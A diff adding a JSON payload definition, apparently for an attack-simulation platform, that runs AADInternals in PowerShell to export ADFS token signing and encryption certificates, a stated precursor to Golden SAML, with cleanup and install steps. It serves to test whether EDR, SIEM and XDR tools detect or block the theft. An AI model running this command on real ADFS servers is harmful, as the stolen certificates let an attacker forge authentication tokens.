@@ -1,0 +1,47 @@
+{
+  "command_content": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
+  "command_executor": "psh",
+  "payload_attack_patterns": [
+    "T1552.004"
+  ],
+  "payload_cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
+  "payload_cleanup_executor": "psh",
+  "payload_description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
+  "payload_domains": [
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    }
+  ],
+  "payload_elevation_required": false,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "78e95057-d429-4e66-8f82-0f060c1ac96f",
+  "payload_name": "ADFS token signing and encryption certificates theft - Local",
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_prerequisites": [
+    {
+      "check_command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
+      "description": "AADInternals module must be installed.\n",
+      "executor": "psh",
+      "get_command": "Install-Module -Name AADInternals -Force\n"
+    }
+  ],
+  "payload_type": "Command"
+}
